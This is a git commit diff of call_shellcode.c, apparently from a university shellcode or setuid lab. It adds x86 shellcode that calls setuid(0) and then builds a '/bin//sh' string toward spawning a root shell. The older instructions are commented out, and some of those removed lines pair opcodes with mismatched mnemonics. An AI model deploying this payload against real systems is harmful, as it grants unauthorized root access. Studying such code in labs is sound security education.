048ce19a38ced18ecc27d644ccc3d0fa6b2bf962
Alexander Cooper <alexanderecooper@arizona.edu>
2025-03-30 14:33:41 -0700

    commit

--- call_shellcode.c
+++ call_shellcode.c
@@ -6,18 +6,22 @@
 #include <string.h>
 
 const char code[] =
-  "\x31\xc0"             /* xorl    %eax,%eax              */
+  
+"\x6a\x17"               /* push    $0x17                  */
+"\x58"                   /* pop     %eax                   */
+"\x31\xdb"               /* xor     %ebx,%ebx              */
+"\xcd\x80"               /* int     $0x80                  */
 
-  "\x89\xe3"             /* movl    %esp,%ebx              */
-  "\x50"                 /* pushl   %eax                   */
-  "\x53"                 /* pushl   %ebx                   */
-  "\x89\xe1"             /* movl    %esp,%ecx              */
-  "\x99"                 /* cdq                            */
-  "\x50"                 /* pushl   %eax                   */
-  "\x17\x0b"             /* movb    $0x17,%al              */
-  "\xcd\x80"             /* int     $0x80                  */
-  "\x31\xc0"             /* xorl    %eax,%eax              */
+  // "\x89\xe3"             /* movl    %esp,%ebx              */
+  // "\x50"                 /* pushl   %eax                   */
+  // "\x53"                 /* pushl   %ebx                   */
+  // "\x89\xe1"             /* movl    %esp,%ecx              */
+  // "\x99"                 /* cdq                            */
+  // "\x50"                 /* pushl   %eax                   */
+  // "\x17\x0b"             /* movb    $0x17,%al              */
+  // "\xcd\x80"             /* int     $0x80                  */
 
+  "\x31\xc0"             /* xorl    %eax,%eax              */
   "\x50"                 /* pushl   %eax                   */
   "\x68""//sh"           /* pushl   $0x68732f2f            */
   "\x68""/bin"           /* pushl   $0x6e69622f            */
